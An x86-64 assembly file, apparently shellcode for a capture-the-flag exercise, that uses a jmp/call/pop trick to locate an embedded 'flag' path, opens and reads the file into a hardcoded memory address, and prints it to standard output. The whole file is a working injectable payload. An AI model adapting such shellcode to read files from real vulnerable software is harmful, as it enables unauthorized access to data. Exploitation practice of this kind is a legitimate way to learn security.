SYS_OPEN equ 2
SYS_READ equ 0
SYS_WRITE equ 1
STDOUT equ 1
FLAG_SIZE equ 240
WRITABLE equ 007ffff7fc2000h

section .text
global _start

_start:
    jmp path
open_flag:
    pop rdi
    ; Open the flag file
    mov rax, SYS_OPEN
    ; mov rdi, var
    mov rsi, 0
    syscall

    ; Save fd into rbx
    mov rbx, rax

    ; Load flag buffer address
    jmp flag
load_flag:
    pop rsi
    mov rsi, [rsi]

    ; Read flag from file descriptor
read:
    mov rax, SYS_READ
    mov rdi, rbx ; rbx -> file descriptor
    ; mov rsi, flag
    mov rdx, FLAG_SIZE
    syscall

    ; Print flag on standard output
    mov rax, SYS_WRITE
    mov rdi, STDOUT
    ; mov rsi, flag
    mov rdx, FLAG_SIZE
    syscall
    
    ; Exit
    mov rax, 60
    mov rdi, 0
    syscall

path:
    call open_flag
    db "flag", 0
flag:
    call load_flag
    dq 0x007ffff7fc2000
